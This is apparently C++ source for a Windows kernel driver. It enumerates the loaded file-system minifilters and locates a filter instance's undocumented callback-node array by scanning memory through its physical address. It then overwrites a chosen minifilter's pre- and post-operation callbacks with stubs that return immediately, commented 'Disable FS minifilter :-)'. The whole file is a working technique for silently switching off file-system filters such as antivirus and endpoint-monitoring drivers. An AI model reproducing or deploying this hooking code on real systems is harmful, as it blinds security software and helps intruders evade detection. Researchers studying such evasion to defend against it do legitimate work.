#include "FsMinifilterHooking.h"
#include "Log.h"
#include "FsMinifilterProto.h"
#include "Common.h"

//////////////////////////////////////////////////////////////////////////
// Get CallbackNodes by instance
//////////////////////////////////////////////////////////////////////////
PCALLBACK_NODE GetCachedCallbackNodesByInstance(PFLT_INSTANCE instance)
{
    for (size_t instanceIndex = 0; instanceIndex < originalInstances->getSize(); instanceIndex++)
    {
        if (instance == (*originalInstances)[instanceIndex]->get())
        {
            return (*originalInstances)[instanceIndex]->getCachedCallbackNodes();
        }
    }

    return NULL;
}

//////////////////////////////////////////////////////////////////////////
// Is CallbackNode it has PreOperation
//////////////////////////////////////////////////////////////////////////
bool IsCallbackNode(
    PCALLBACK_NODE potentialCallbackNode,
    PFLT_INSTANCE pFltInstance,
    void* preCallback)
{
    return ((potentialCallbackNode->PreOperation == preCallback) &&
            (potentialCallbackNode->Instance == pFltInstance));
}

//////////////////////////////////////////////////////////////////////////
// Read memory safe
//////////////////////////////////////////////////////////////////////////
bool ReadMemorySafe(void* targetAddress, void* allocatedBuffer, unsigned short lengthToRead)
{
    auto physicalAddress = MmGetPhysicalAddress(targetAddress);
    if (physicalAddress.QuadPart)
    {
        auto newVirtualAddress = MmMapIoSpace(physicalAddress, lengthToRead, MmNonCached);
        if (newVirtualAddress != NULL)
        {
            RtlCopyMemory(allocatedBuffer, newVirtualAddress, lengthToRead);
            MmUnmapIoSpace(newVirtualAddress, lengthToRead);
            return true;
        }
    }
    return false;
}

//////////////////////////////////////////////////////////////////////////
// Get offset CallbackNodes
//////////////////////////////////////////////////////////////////////////
unsigned short GetOffsetOfCallbackNodes(
    FltFilterGuard& filter,
    unsigned short limit,
    void * preCallbackFunc,
    unsigned short callbackIndex)
{
    void* potentialPointer;
    unsigned short offset = FltInstanceGuard::INVALID_OFFSET;
    ArrayGuard<FltInstanceGuard*, true> instancesArray;
    unsigned long fltInstancesNumber = filter.getInstances(instancesArray);

    if (fltInstancesNumber == 0)
    {
        return offset;
    }

    // Allocate memory of the instance object memory
    auto memorySize = limit / sizeof(unsigned short);
    ArrayGuard<unsigned short> instanceObjectMemory;
    instanceObjectMemory.allocate(NonPagedPool, memorySize);

    // Safe read instance object memory
    if (ReadMemorySafe(instancesArray[0]->get(), instanceObjectMemory.get(), limit) == false)
    {
        return offset;
    }

    // Over the memory to find the offset of teh callback
    for (unsigned short i = 0; i < limit / sizeof(unsigned short); i++)
    {
        potentialPointer = reinterpret_cast<void*>(*(reinterpret_cast<PULONG_PTR>(
            reinterpret_cast<unsigned short*>(instanceObjectMemory.get()) + i)));

        if (MmIsAddressValid(potentialPointer) && (IsCallbackNode(
            reinterpret_cast<PCALLBACK_NODE>(potentialPointer),
            instancesArray[0]->get(),
            preCallbackFunc)))
        {
            offset = i * sizeof(unsigned short) - callbackIndex * sizeof(PCALLBACK_NODE);
            break;
        }
    }

    return offset;
}

//////////////////////////////////////////////////////////////////////////
// Dummy PreOperation FS minifilter
//////////////////////////////////////////////////////////////////////////
FLT_PREOP_CALLBACK_STATUS DummyCreatePreOperation(PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID* CompletionContext)
{
    UNREFERENCED_PARAMETER(Data);
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);

    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

//////////////////////////////////////////////////////////////////////////
// Hook FS minifilter
//////////////////////////////////////////////////////////////////////////
FLT_PREOP_CALLBACK_STATUS HookPreOperationFunction(
    PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID* CompletionContext)
{
    UNREFERENCED_PARAMETER(Data);
    UNREFERENCED_PARAMETER(CompletionContext);

//     PCALLBACK_NODE originalCallbackNodes = GetCachedCallbackNodesByInstance(FltObjects->Instance);
//     if (originalCallbackNodes == NULL)
//     {
//         return FLT_PREOP_SUCCESS_NO_CALLBACK;
//     }

    // Disable FS minifilter :-)
    UNREFERENCED_PARAMETER(FltObjects);
    return FLT_PREOP_SUCCESS_NO_CALLBACK;

//     auto originalPreCallback = reinterpret_cast<PreCallbackProt>(
//         originalCallbackNodes[static_cast<INT8>(Data->Iopb->MajorFunction) + 0x16].PreOperation);
// 
//     return originalPreCallback(Data, FltObjects, CompletionContext);
}

FLT_POSTOP_CALLBACK_STATUS HookPostOperationFunction(
    PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID CompletionContext,
    FLT_POST_OPERATION_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(CompletionContext);
    UNREFERENCED_PARAMETER(Flags);

//     PCALLBACK_NODE originalCallbackNodes = GetCachedCallbackNodesByInstance(FltObjects->Instance);
//     if (originalCallbackNodes == NULL)
//     {
//         return FLT_POSTOP_FINISHED_PROCESSING;
//     }

    // Disable FS minifilter :-)
    UNREFERENCED_PARAMETER(Data);
    UNREFERENCED_PARAMETER(FltObjects);
    return FLT_POSTOP_FINISHED_PROCESSING;

//     auto originalPostCallback = reinterpret_cast<PostCallbackProt>(
//         originalCallbackNodes[static_cast<INT8>(Data->Iopb->MajorFunction) + 0x16].PostOperation);
// 
//     return originalPostCallback(Data, FltObjects, CompletionContext, Flags);
}

//////////////////////////////////////////////////////////////////////////
// Hook function
//////////////////////////////////////////////////////////////////////////
void HookFunction(PVOID* pSourceFunction, PVOID hookFunction)
{
    if (MmIsAddressValid(*pSourceFunction))
    {
        InterlockedExchangePointer(pSourceFunction, hookFunction);
    }
}

//////////////////////////////////////////////////////////////////////////
// Hook callbacks
//////////////////////////////////////////////////////////////////////////
VOID HookCallbacks(FltFilterGuard& filter)
{
    ArrayGuard<FltInstanceGuard*, true> instancesArray;
    ULONG instancesCount = filter.getInstances(instancesArray);

    if (instancesCount == 0)
    {
        return;
    }

    originalInstances = new ArrayGuard<FltInstanceGuard*, true>();
    originalInstances->allocate(NonPagedPool, instancesCount);

    for (size_t instanceIndex = 0; instanceIndex < instancesCount; instanceIndex++)
    {
        (*originalInstances)[instanceIndex] =
            new FltInstanceGuard(instancesArray[instanceIndex]->get(), false, false, true);
        (*originalInstances)[instanceIndex]->cachingCallbackNodes();

        PCALLBACK_NODE* callbackNodesList =
            (*originalInstances)[instanceIndex]->getPointerToCallbackNodesField();

        for (size_t callbackIndex = 0X16;
             callbackIndex <= IRP_MJ_MAXIMUM_FUNCTION + 0X16;
             callbackIndex++)
        {
            PCALLBACK_NODE callbackNode = callbackNodesList[callbackIndex];

            if (MmIsAddressValid(callbackNode))
            {
                HookFunction(&(callbackNode->PreOperation), &HookPreOperationFunction);
                HookFunction(&(callbackNode->PostOperation), &HookPostOperationFunction);
            }
        }
    }
}

//////////////////////////////////////////////////////////////////////////
// Unhook callbacks
//////////////////////////////////////////////////////////////////////////
VOID UnHookCallbacks()
{
    if (originalInstances == NULL)
    {
        return;
    }

    for (size_t instanceIndex = 0;
         instanceIndex < originalInstances->getSize();
         instanceIndex++)
    {
        FltInstanceGuard instance((*originalInstances)[instanceIndex]->get(), true, true, false);

        if (!instance.isValid())
        {
            // The instance is tear down
            continue;
        }

        PCALLBACK_NODE* callbackNodesList = instance.getPointerToCallbackNodesField();
        auto cachedCallbackNodes = (*originalInstances)[instanceIndex]->getCachedCallbackNodes();

        for (size_t callbackIndex = 0x16;
             callbackIndex <= IRP_MJ_MAXIMUM_FUNCTION + 0x16;
             callbackIndex++)
        {
            PCALLBACK_NODE callbackNode = callbackNodesList[callbackIndex];

            if (MmIsAddressValid(callbackNode))
            {
                HookFunction(
                    &(callbackNode->PreOperation),
                    cachedCallbackNodes[callbackIndex].PreOperation);

                HookFunction(
                    &(callbackNode->PostOperation),
                    cachedCallbackNodes[callbackIndex].PostOperation);
            }

        }
    }

    delete originalInstances;
}

//////////////////////////////////////////////////////////////////////////
// Driver unload
//////////////////////////////////////////////////////////////////////////
VOID FSH_Unload(PDRIVER_OBJECT  DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    FSH_UnHook();

    LOG("[+] Driver FS minifilter has been unloaded");
}

//////////////////////////////////////////////////////////////////////////
// Driver entry
//////////////////////////////////////////////////////////////////////////
NTSTATUS FSH_DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS status = STATUS_SUCCESS;

    FltFilterGuard dummyFilter(DriverObject, FilterRegistration);
    status = dummyFilter.startFiltering();
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    unsigned short offsetCallbackNodes = GetOffsetOfCallbackNodes(
        dummyFilter,
        0x230,
        DummyCreatePreOperation,
        IRP_MJ_CREATE + 0X16);

    dummyFilter.~FltFilterGuard();

    if (offsetCallbackNodes != FltInstanceGuard::INVALID_OFFSET)
    {
        FltInstanceGuard::setOffsetCallbackNodes(offsetCallbackNodes);

        LOG("[+] Driver FS minifilter hook initialize success");

        status = STATUS_SUCCESS;
    }
    else
    {
        LOG("[-] Driver FS minifilter hook initialize failed");

        status = STATUS_UNSUCCESSFUL;
    }

    return status;
}

//////////////////////////////////////////////////////////////////////////
// Get list FS minifilters
//////////////////////////////////////////////////////////////////////////
constexpr ULONG POOL_TAG = 'FSH0';
WCHAR g_listFSMinifilters[DEF_MOD_NAME_COUNT * DEF_MOD_NAME_LEN_SYM] = L"";
ULONG g_cntFSMinifilters = 0;

ULONG FSH_GetListFilters(PWCHAR *data)
{
    NTSTATUS status = STATUS_SUCCESS;
    ULONG numberFiltersReturned, sizeOfBuffer;
    PFLT_FILTER* filterList;
    PFILTER_FULL_INFORMATION filterFullInformation;
    ULONG i;

    ::memset(g_listFSMinifilters, 0, sizeof(g_listFSMinifilters));
    g_cntFSMinifilters = 0;

    status = FltEnumerateFilters(NULL, 0, &numberFiltersReturned);
    if ((status == STATUS_BUFFER_TOO_SMALL) && numberFiltersReturned)
    {
        sizeOfBuffer = sizeof(PFLT_FILTER) * numberFiltersReturned;
        filterList = (PFLT_FILTER*)ExAllocatePoolWithTag(NonPagedPool, sizeOfBuffer, POOL_TAG);
        if (filterList)
        {
            status = FltEnumerateFilters(filterList, sizeOfBuffer, &numberFiltersReturned);
            for (i = 0; NT_SUCCESS(status) && (i < numberFiltersReturned); i++)
            {
                status = FltGetFilterInformation(filterList[i], FilterFullInformation, NULL, 0, &sizeOfBuffer);
                if ((status == STATUS_BUFFER_TOO_SMALL) && sizeOfBuffer)
                {
                    filterFullInformation = (PFILTER_FULL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, sizeOfBuffer, POOL_TAG);
                    if (filterFullInformation)
                    {
                        status = FltGetFilterInformation(filterList[i], FilterFullInformation, filterFullInformation, sizeOfBuffer, &sizeOfBuffer);
                        if (NT_SUCCESS(status))
                        {
                            if (i < DEF_MOD_NAME_COUNT)
                            {
                                ::memcpy_s(
                                    &g_listFSMinifilters[i * DEF_MOD_NAME_LEN_SYM], 
                                    sizeof(WCHAR) * (DEF_MOD_NAME_LEN_SYM - 1), 
                                    filterFullInformation->FilterNameBuffer, 
                                    filterFullInformation->FilterNameLength);
                                g_cntFSMinifilters++;

                                LOG("Found & add minifilter: %ws", &g_listFSMinifilters[i * DEF_MOD_NAME_LEN_SYM]);
                            }
                            else
                            {
                                UNICODE_STRING nameMf;
                                nameMf.Buffer = filterFullInformation->FilterNameBuffer;
                                nameMf.Length = filterFullInformation->FilterNameLength;
                                nameMf.MaximumLength = filterFullInformation->FilterNameLength;

                                LOG("Found & skip minifilter (array is full): %wZ", &nameMf);
                            }

                        }
                        ExFreePoolWithTag(filterFullInformation, POOL_TAG);
                    }
                }
                FltObjectDereference(filterList[i]);
            }
            ExFreePoolWithTag(filterList, POOL_TAG);
        }
    }

    *data = g_listFSMinifilters;

    return g_cntFSMinifilters;
}

//////////////////////////////////////////////////////////////////////////
// Get name FS minifilter by index
//////////////////////////////////////////////////////////////////////////
PWCHAR FSH_GetFSMinifilterByIndex(ULONG index)
{
    if (index >= g_cntFSMinifilters)
        return NULL;

    return &g_listFSMinifilters[index * DEF_MOD_NAME_LEN_SYM];
}

//////////////////////////////////////////////////////////////////////////
// Hook minifilter
//////////////////////////////////////////////////////////////////////////
volatile LONG g_hookMinifilter = FALSE;

NTSTATUS FSH_Hook(PUNICODE_STRING filterName)
{
    NTSTATUS status;

    if (g_hookMinifilter == FALSE)
    {
        FltFilterGuard filter(filterName);
        if (filter.isValid())
        {
            HookCallbacks(filter);

            InterlockedExchange(&g_hookMinifilter, TRUE);

            LOG("[+] Hook FS minifilter: %wZ", filterName);
            
            status = STATUS_SUCCESS;
        }
        else
        {
            LOG("[-] Hook FS minifilter: %wZ", filterName);

            status = STATUS_UNSUCCESSFUL;
        }
    }
    else
    {
        LOG("[-] Already hooked FS minifilter");

        status = STATUS_ALREADY_REGISTERED;
    }

    return status;
}

//////////////////////////////////////////////////////////////////////////
// Unhook minifilter
//////////////////////////////////////////////////////////////////////////
NTSTATUS FSH_UnHook()
{
    NTSTATUS status;

    if (g_hookMinifilter == TRUE)
    {
        UnHookCallbacks();

        InterlockedExchange(&g_hookMinifilter, FALSE);

        LOG("[+] Unhooked FS minifilter");
        
        status = STATUS_SUCCESS;
    }
    else
    {
        LOG("[-] Not hooked FS minifilter");

        status = STATUS_ALREADY_REGISTERED;
    }

    return status;
}
